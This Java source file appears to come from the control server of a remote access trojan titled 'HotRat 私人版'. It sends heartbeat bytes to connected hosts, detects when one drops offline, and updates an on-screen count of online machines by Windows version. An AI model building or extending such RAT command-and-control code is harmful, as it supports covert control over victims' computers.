package me.server.receive;

import me.server.Server;
import me.server.utils.MessageFlags;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.io.DataOutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SendHeartPack extends Thread{
    private JFrame frame;
    private JTextArea area;
    private String[] context;
    private String osName;
    private Socket socket;
    private JTable table;
    private DefaultTableModel defaultTableModel;
    private String contexts;
    public SendHeartPack(Socket socket, JFrame frame, JTextArea area, String osName, String[] context, JTable table, DefaultTableModel defaultTableModel,String contexts) {
        this.frame = frame;
        this.area = area;
        this.context = context;
        this.osName = osName;
        this.socket = socket;
        this.table = table;
        this.defaultTableModel = defaultTableModel;
        this.contexts = contexts;
    }

    public void run() {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
            while (true) {
                Thread.sleep(5000L);
                dataOutputStream.write(MessageFlags.HEARTPACK);
            }
        } catch (Exception var4) {
            try {
                Date date = new Date();
                SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
                String name = context[1];
                area.append("[" + format.format(date)  + "]" +"有主机下线请注意!" + " 主机名称:" + name + "\n");
                Server.map.remove(contexts);
                Server.flashTable(table,defaultTableModel);
                frame.repaint();
                JOptionPane.showMessageDialog(null,name + ":主机已经下线..","提示",JOptionPane.ERROR_MESSAGE);
                if(osName.toLowerCase().indexOf("xp")!=-1) {
                    Server.WINDOWSXP--;
                    Server.ALL--;
                    frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
                } else if (osName.toLowerCase().indexOf("7")!=-1) {
                    Server.WINDOWS7--;
                    Server.ALL--;
                    frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
                }else if (osName.toLowerCase().indexOf("10")!=-1 || osName.toLowerCase().indexOf("11")!=-1) {
                    Server.WINDOWS10--;
                    Server.ALL--;
                    frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
                }else {
                    Server.OTHER--;
                    Server.ALL--;
                    frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
                }
            } catch (Exception var3) {
            }
        }
    }
}
